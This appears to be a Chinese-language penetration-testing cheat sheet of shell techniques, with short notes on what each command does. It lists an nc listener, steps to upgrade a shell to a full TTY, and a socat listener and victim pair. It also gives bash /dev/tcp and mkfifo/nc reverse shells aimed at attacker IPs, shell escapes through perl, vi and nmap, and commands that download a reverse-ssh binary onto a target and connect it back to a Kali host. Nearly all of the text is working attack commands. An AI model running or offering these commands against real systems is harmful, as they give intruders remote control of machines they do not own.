## 交互shell
`rlwrap -cAr nc -lvnp 1234`
>rlwrap: 为命令行提供 readline 功能（历史记录、行编辑等）
>-c: 启用命令完成
>-A: 自动完成文件名
>-r: 记住输入历史

## 升级完全shell
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
>使用 Python 生成一个伪终端 (pty) 并启动 bash
>伪终端模拟了真实终端的特性，包括:
>行缓冲(Line buffering)
>信号处理(Signal handling)
>作业控制(Job control)
>这使Shell获得终端特性(TTY特性)

`export SHELL=bash`
>设置正确的Shell环境变量
>确保系统知道当前使用的是Bash
>影响某些应用程序的Shell调用行为

`export TERM=xterm-256color` 
>设置终端类型
>使Shell支持:
>高级终端功能
>颜色显示
>特殊按键响应

**ctrl+z**
>作用：挂起当前Shell进程
>发送SIGTSTP信号
>为后续终端设置做准备

`stty raw -echo;fg`
>配置终端原始模式
>raw模式：禁用输入处理，直接传递原始数据
>-echo：禁用回显(避免双重回显)
>fg：将挂起的进程带回前台

`reset`
>作用：重置终端设置
>清除可能的错误配置
>确保终端处于干净状态
>重新初始化终端驱动

## socat
#### Listener:
`socat file:`tty`,raw,echo=0 tcp-listen:4444`
#### Victim:
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`



## 反向shell
`bash -i >& /dev/tcp/$ip/$port 0>&1`
不支持/dev/tcp
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.218.148 4444 > /tmp/f`

## 生成shell
`python -c 'import pty; pty.spawn("/bin/sh")'`
`echo os.system('/bin/bash')`
`/bin/sh -i`
`script -qc /bin/bash /dev/null`
`perl -e 'exec "/bin/sh";'`
`perl: exec "/bin/sh";`
`ruby: exec "/bin/sh"`
`lua: os.execute('/bin/sh')`
`IRB: exec "/bin/sh"`
`vi: :!bash`
`vi: :set shell=/bin/bash:shell`
`nmap: !sh`


## 反向ssh
#### 在目标机上使用
`wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh`
`/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2`